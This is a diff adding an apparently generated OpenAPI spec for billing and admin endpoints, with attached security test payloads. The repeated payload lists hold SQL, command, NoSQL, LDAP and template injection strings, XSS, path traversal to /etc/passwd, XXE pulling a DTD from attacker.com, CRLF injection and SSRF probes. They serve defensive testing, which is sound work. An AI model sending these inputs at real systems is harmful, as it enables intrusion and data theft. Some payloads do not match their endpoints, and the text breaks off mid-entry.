@@ -1,0 +1,5487 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "AI-Enriched API",
+    "version": "1.0.0",
+    "description": "API specification generated with AI enrichment"
+  },
+  "paths": {
+    "/internal/admin/transactions/{transaction_id}": {
+      "delete": {
+        "summary": "Delete transaction",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "x_admin_key",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "adminKey": []
+          }
+        ],
+        "description": "Admin endpoint to delete transaction."
+      }
+    },
+    "/api/v1/billing/invoices/{invoice_id}": {
+      "get": {
+        "summary": "Get invoice",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          },
+          "403": {
+            "description": "Forbidden"
+          }
+        },
+        "parameters": [
+          {
+            "name": "invoice_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Retrieve a specific invoice."
+      },
+      "any": {
+        "summary": "Get invoice",
+        "responses": {
+          "200": {
+            "description": "Invoice details"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "invoice_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Get invoice details. Invoice must belong to authenticated user."
+      }
+    },
+    "/api/v1/billing/invoices/{invoice_id}/pay": {
+      "get": {
+        "summary": "Pay invoice",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "parameters": [
+          {
+            "name": "invoice_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "description": "Pay an invoice by ID."
+      },
+      "post": {
+        "summary": "Get invoice",
+        "responses": {
+          "200": {
+            "description": "Success"
+          },
+          "403": {
+            "description": "Forbidden"
+          },
+          "409": {
+            "description": "Conflict"
+          }
+        },
+        "parameters": [
+          {
+            "name": "invoice_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Get invoice details.",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object"
+              }
+            }
+          }
+        },
+        "x-test-payloads": {
+          "valid": [
+            {},
+            {}
+          ],
+          "edge_cases": [
+            {},
+            {
+              "invoice_id": "invoice_1234567890_987654321"
+            },
+            {
+              "invoice_id": "invoice_1234567890_987654321"
+            }
+          ],
+          "fuzz": [
+            {
+              "random_key": "invalid_value"
+            },
+            {
+              "invoice_id": null
+            }
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": [
+            {
+              "name": "limit_below_minimum",
+              "category": "logic_fuzz",
+              "description": "'limit' below minimum allowed value (ge=1)",
+              "payload": {
+                "limit": 0
+              },
+              "confidence": 0.5,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint"
+              ],
+              "fp_risk": "medium",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "range_violation",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_above_maximum",
+              "category": "logic_fuzz",
+              "description": "'limit' above maximum allowed value (le=1000)",
+              "payload": {
+                "limit": 1001
+              },
+              "confidence": 0.5,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint"
+              ],
+              "fp_risk": "medium",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "range_violation",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_float_for_integer",
+              "category": "logic_fuzz",
+              "description": "Float value for integer field 'limit'",
+              "payload": {
+                "limit": 1.5
+              },
+              "confidence": 0.5,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint"
+              ],
+              "fp_risk": "medium",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "type_coercion",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_string_for_integer",
+              "category": "logic_fuzz",
+              "description": "String value for integer field 'limit'",
+              "payload": {
+                "limit": "not_a_number"
+              },
+              "confidence": 0.5,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint"
+              ],
+              "fp_risk": "medium",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "type_coercion",
+              "source": "logic_fuzz_deterministic"
+            }
+          ]
+        }
+      },
+      "any": {
+        "summary": "Pay invoice",
+        "responses": {
+          "200": {
+            "description": "Payment successful"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "invoice_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Pay an invoice. Invoice must belong to authenticated user."
+      }
+    },
+    "/api/v1/subscriptions/{subscription_id}": {
+      "delete": {
+        "summary": "Cancel subscription",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "parameters": [
+          {
+            "name": "subscription_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Cancel an active subscription."
+      },
+      "get": {
+        "summary": "Get subscription",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          }
+        },
+        "parameters": [
+          {
+            "name": "subscription_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "description": "Retrieve a subscription."
+      },
+      "any": {
+        "summary": "Cancel subscription",
+        "responses": {
+          "204": {
+            "description": "Subscription cancelled"
+          },
+          "403": {
+            "description": "Access denied"
+          },
+          "404": {
+            "description": "Subscription not found"
+          }
+        },
+        "parameters": [
+          {
+            "name": "subscription_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Cancel a subscription."
+      }
+    },
+    "/internal/admin/database/reset": {
+      "post": {
+        "summary": "Reset database",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "parameters": [
+          {
+            "name": "X-Admin-Key",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "adminAuth": []
+          }
+        ],
+        "description": "Reset the database.",
+        "x-test-payloads": {
+          "valid": [
+            {},
+            {}
+          ],
+          "edge_cases": [
+            {
+              "reset": true
+            },
+            {
+              "reset": "true"
+            },
+            {
+              "reset": 1
+            }
+          ],
+          "fuzz": [
+            {
+              "invalid_key": "value"
+            },
+            null
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      }
+    },
+    "/internal/admin/export": {
+      "post": {
+        "summary": "Export data",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "format": {
+                    "type": "string"
+                  },
+                  "max_records": {
+                    "type": "integer"
+                  }
+                },
+                "required": [
+                  "format",
+                  "max_records"
+                ]
+              }
+            }
+          }
+        },
+        "parameters": [
+          {
+            "name": "X-Admin-Key",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "adminAuth": []
+          }
+        ],
+        "description": "Export transaction data.",
+        "x-test-payloads": {
+          "valid": [
+            {
+              "format": "csv",
+              "max_records": 1000
+            },
+            {
+              "format": "json",
+              "max_records": 100
+            }
+          ],
+          "edge_cases": [
+            {
+              "format": "pdf",
+              "max_records": 10000
+            },
+            {
+              "format": "xml",
+              "max_records": 1
+            },
+            {
+              "format": "csv",
+              "max_records": 500
+            }
+          ],
+          "fuzz": [
+            {
+              "format": "invalid",
+              "max_records": -1
+            },
+            {}
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      }
+    },
+    "/internal/admin/refund-batch": {
+      "post": {
+        "summary": "Batch refunds",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "transaction_ids": {
+                    "type": "array",
+                    "items": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "required": [
+                  "transaction_ids"
+                ]
+              }
+            }
+          }
+        },
+        "parameters": [
+          {
+            "name": "X-Admin-Key",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "adminAuth": []
+          }
+        ],
+        "description": "Process batch refunds.",
+        "x-test-payloads": {
+          "valid": [
+            {
+              "subscription_id": "sub_01GFNC9ZTXD7XQHV2PJBXWQZ",
+              "customer_id": "cus_01GFNC9ZTXD7XQHV2PJBXWQZ"
+            },
+            {
+              "subscription_id": "sub_01GFNC9ZTXD7XQHV2PJBXWQZ",
+              "customer_id": "cus_01GFNC9ZTXD7XQHV2PJBXWQZ"
+            }
+          ],
+          "edge_cases": [
+            {
+              "subscription_id": "sub_01GFNC9ZTXD7XQHV2PJBXWQZ",
+              "customer_id": "cus_01GFNC9ZTXD7XQHV2PJBXWQZ",
+              "status": "cancelled"
+            },
+            {
+              "subscription_id": "sub_01GFNC9ZTXD7XQHV2PJBXWQZ",
+              "customer_id": "cus_01GFNC9ZLXD7XQHV2PJBXWQZ"
+            },
+            {
+              "subscription_id": "sub_01GFNC9ZLXD7XQHV2PJBXWQZ",
+              "customer_id": "cus_01GFNC9ZTXD7XQHV2PJBXWQZ"
+            }
+          ],
+          "fuzz": [
+            {
+              "subscription_id": 123,
+              "customer_id": "invalid"
+            },
+            {}
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
